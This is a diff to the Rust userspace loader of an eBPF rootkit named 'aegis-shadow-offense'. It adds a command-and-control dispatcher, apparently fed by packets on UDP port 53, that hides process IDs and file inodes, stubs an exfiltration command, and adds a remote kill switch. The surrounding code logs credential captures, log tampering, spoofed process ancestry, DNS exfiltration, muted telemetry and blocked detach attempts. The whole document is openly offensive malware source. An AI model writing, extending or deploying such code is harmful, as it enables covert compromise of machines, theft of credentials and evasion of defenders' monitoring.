@@ -1,7 +1,7 @@
 use anyhow::{Context, Result};
 use aya::{
     include_bytes_aligned,
-    maps::{AsyncPerfEventArray, HashMap},
+    maps::{AsyncPerfEventArray, HashMap, MapData},
     programs::{
         tc::{SchedClassifier, TcAttachType},
         KProbe, TracePoint, Xdp, XdpFlags,
@@ -21,7 +21,9 @@ use log::{debug, error, info, warn};
 use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
 use std::fs;
 use std::path::Path;
+use std::sync::{Arc, Mutex};
 use tokio::signal;
+use tokio::sync::watch;
 
 #[derive(Debug, Parser)]
 #[command(name = "aegis-shadow-offense")]
@@ -58,6 +60,11 @@ struct Cli {
     /// Pin BPF maps to filesystem for persistence
     #[arg(long)]
     pin_maps: bool,
+}
+
+struct C2Maps {
+    hidden_pids: Mutex<HashMap<MapData, u32, u8>>,
+    obfuscate_inodes: Mutex<HashMap<MapData, u64, u8>>,
 }
 
 #[tokio::main]
@@ -326,16 +333,36 @@ async fn main() -> Result<()> {
         }
     }
 
-    // Start event monitoring
-    tokio::spawn(monitor_events(bpf));
+    // Extract maps for C2 command dispatch before moving bpf
+    let hidden_pids_map = bpf
+        .take_map("HIDDEN_PIDS")
+        .context("HIDDEN_PIDS not found")?;
+    let obfuscate_inodes_map = bpf
+        .take_map("OBFUSCATE_INODES")
+        .context("OBFUSCATE_INODES not found")?;
+
+    let c2_maps = Arc::new(C2Maps {
+        hidden_pids: Mutex::new(HashMap::try_from(hidden_pids_map)?),
+        obfuscate_inodes: Mutex::new(HashMap::try_from(obfuscate_inodes_map)?),
+    });
+
+    let (kill_tx, mut kill_rx) = watch::channel(false);
+
+    // Start event monitoring with C2 dispatch
+    tokio::spawn(monitor_events(bpf, Arc::clone(&c2_maps), kill_tx));
 
     info!("🚀 Rootkit active. Press Ctrl+C to detach and exit.");
     info!("📡 Listening for C2 commands on UDP port 53...");
 
-    // Wait for Ctrl+C
-    signal::ctrl_c().await?;
+    tokio::select! {
+        _ = signal::ctrl_c() => {
+            info!("🛑 Shutting down (Ctrl+C)...");
+        }
+        _ = async { while !*kill_rx.borrow_and_update() { kill_rx.changed().await.ok(); } } => {
+            info!("🛑 Kill switch activated via C2. Shutting down...");
+        }
+    }
 
-    info!("🛑 Shutting down...");
     Ok(())
 }
 
@@ -355,7 +382,7 @@ fn pin_all_maps(bpf: &mut Ebpf) -> Result<()> {
     Ok(())
 }
 
-async fn monitor_events(mut bpf: Ebpf) {
+async fn monitor_events(mut bpf: Ebpf, c2_maps: Arc<C2Maps>, kill_tx: watch::Sender<bool>) {
     let events_map = match bpf.take_map("EVENTS") {
         Some(map) => map,
         None => {
@@ -391,8 +418,10 @@ async fn monitor_events(mut bpf: Ebpf) {
 
     for cpu in cpus.iter() {
         if let Ok(buf) = events.open(*cpu, None) {
+            let maps = Arc::clone(&c2_maps);
+            let kill = kill_tx.clone();
             tokio::spawn(async move {
-                process_event_buf(buf).await;
+                process_event_buf(buf, maps, kill).await;
             });
         }
         if let Ok(buf) = cred_events.open(*cpu, None) {
@@ -405,6 +434,8 @@ async fn monitor_events(mut bpf: Ebpf) {
 
 async fn process_event_buf(
     mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<aya::maps::MapData>,
+    c2_maps: Arc<C2Maps>,
+    kill_tx: watch::Sender<bool>,
 ) {
     let mut bufs = (0..10)
         .map(|_| BytesMut::with_capacity(1024))
@@ -420,7 +451,13 @@ async fn process_event_buf(
         for buf in bufs.iter().take(events.read) {
             if buf.len() >= std::mem::size_of::<EventHeader>() {
                 let event = unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const EventHeader) };
-                log_event(&event);
+                if event.event_type == EVENT_PACKET_INTERCEPTED {
+                    let cmd_type = event.pid;
+                    let arg = event.context;
+                    dispatch_c2_command(cmd_type, arg, &c2_maps, &kill_tx);
+                } else {
+                    log_event(&event);
+                }
             }
         }
     }
@@ -448,64 +485,104 @@ async fn process_cred_buf(mut buf: aya::maps::perf::AsyncPerfEventArrayBuffer<ay
     }
 }
 
+fn dispatch_c2_command(
+    cmd_type: u32,
+    arg: u64,
+    c2_maps: &C2Maps,
+    kill_tx: &watch::Sender<bool>,
+) {
+    match cmd_type {
+        1 => {
+            let pid = arg as u32;
+            match c2_maps.hidden_pids.lock() {
+                Ok(mut map) => match map.insert(pid, 1u8, 0) {
+                    Ok(_) => info!("C2: hide_pid {}", pid),
+                    Err(e) => error!("C2: failed to hide PID {}: {}", pid, e),
+                },
+                Err(e) => error!("C2: lock error: {}", e),
+            }
+        }
+        2 => {
+            let pid = arg as u32;
+            match c2_maps.hidden_pids.lock() {
+                Ok(mut map) => match map.remove(&pid) {
+                    Ok(_) => info!("C2: unhide_pid {}", pid),
+                    Err(e) => warn!("C2: unhide PID {} (not found or error): {}", pid, e),
+                },
+                Err(e) => error!("C2: lock error: {}", e),
+            }
+        }
+        3 => {
+            match c2_maps.obfuscate_inodes.lock() {
+                Ok(mut map) => match map.insert(arg, 1u8, 0) {
+                    Ok(_) => info!("C2: obfuscate_file inode={}", arg),
+                    Err(e) => error!("C2: failed to obfuscate inode {}: {}", arg, e),
+                },
+                Err(e) => error!("C2: lock error: {}", e),
+            }
+        }
+        4 => {
+            debug!("C2: exfil request target={}", arg);
+        }
+        5 => {
+            warn!("C2: kill_switch received, initiating shutdown");
+            let _ = kill_tx.send(true);
+        }
+        _ => {
+            warn!("C2: unknown command type={}, arg={}", cmd_type, arg);
+        }
+    }
+}
+
 fn log_event(event: &EventHeader) {
     match event.event_type {
         EVENT_PROC_HIDDEN => {
-            debug!("🙈 Process hidden: PID={}", event.pid);
-        }
-        EVENT_PACKET_INTERCEPTED => {
-            debug!(
-                "📦 C2 packet intercepted: cmd_type={}, arg={}",
-                event.pid, event.context
-            );
+            debug!("Process hidden: PID={}", event.pid);
         }
         EVENT_FILE_OBFUSCATED => {
             debug!(
-                "📄 File obfuscated: PID={}, inode={}",
+                "File obfuscated: PID={}, inode={}",
                 event.pid, event.context
             );
         }
         EVENT_LOG_TAMPERED => {
-            debug!(
-                "📝 Log tampered: PID={}, bytes={}",
-                event.pid, event.context
-            );
+            debug!("Log tampered: PID={}, bytes={}", event.pid, event.context);
         }
         EVENT_ANCESTRY_SPOOFED => {
             debug!(
-                "👪 Ancestry spoofed: PID={}, fake_ppid={}",
+                "Ancestry spoofed: PID={}, fake_ppid={}",
                 event.pid, event.context
             );
         }
         EVENT_DNS_EXFIL => {
-            debug!("🌐 DNS exfiltration: seq={}", event.context);
+            debug!("DNS exfiltration: seq={}", event.context);
         }
         EVENT_KALLSYMS_HIDDEN => {
             debug!(
-                "🔍 Kallsyms hidden: PID={}, inode={}",
+                "Kallsyms hidden: PID={}, inode={}",
                 event.pid, event.context
             );
         }
         EVENT_ANTI_DETACH => {
             debug!(
-                "🛡️ Detach attempt blocked: PID={}, cmd={}",
+                "Detach attempt blocked: PID={}, cmd={}",
                 event.pid, event.context
             );
         }
         EVENT_TIMESTOMPED => {
             debug!(
-                "⏰ Timestamp spoofed: PID={}, inode={}",
+                "Timestamp spoofed: PID={}, inode={}",
                 event.pid, event.context
             );
         }
         EVENT_C2_AUTH_FAILED => {
-            warn!("⚠️ C2 authentication failed: encrypted={}", event.context);
+            warn!("C2 authentication failed: encrypted={}", event.context);
         }
         EVENT_TELEMETRY_MUTED => {
-            debug!("🔇 Telemetry muted: PID={}", event.pid);
+            debug!("Telemetry muted: PID={}", event.pid);
         }
         _ => {
-            debug!("❓ Unknown event: type={}", event.event_type);
+            debug!("Unknown event: type={}", event.event_type);
         }
     }
 }
@@ -513,9 +590,7 @@ fn log_event(event: &EventHeader) {
 fn log_credential_capture(capture: &CredentialCapture) {
     let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
     info!(
-        "🔑 Credential captured: PID={}, FD={}, data={:?}",
+        "Credential captured: PID={}, FD={}, data={:?}",
         capture.pid, capture.fd, data_str
     );
 }
-
-// Made with Bob
